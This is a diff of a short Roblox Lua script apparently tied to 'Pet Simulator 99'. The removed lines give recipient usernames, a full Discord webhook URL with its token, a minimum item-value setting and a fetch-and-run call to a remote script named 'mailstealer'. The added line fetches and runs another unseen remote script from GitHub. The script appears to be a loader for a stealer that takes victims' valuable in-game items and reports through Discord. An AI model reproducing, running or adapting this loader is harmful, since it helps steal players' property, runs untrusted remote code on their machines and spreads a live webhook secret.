@@ -1,9 +1,1 @@
-Username = "petsim99accgrindd"
-Username2 = "petsim99accgrind"
-
-Webhook = "https://discord.com/api/webhooks/1202631135700586496/sAI7zCBpAzQ99_rZRHQ7DKg3wcOp_v3XsShmhCaeIMkN83dVCQqK3dVhyw-I9V5TI3Gi"
-
-LoadingScreen = true
-MinimumRAP = 10000
-
-loadstring(game:HttpGet("https://shz.al/~egorikusa_mailstealer"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/egorpomidor123/premium/main/9d741fde73c08b36da641739.lua'))()
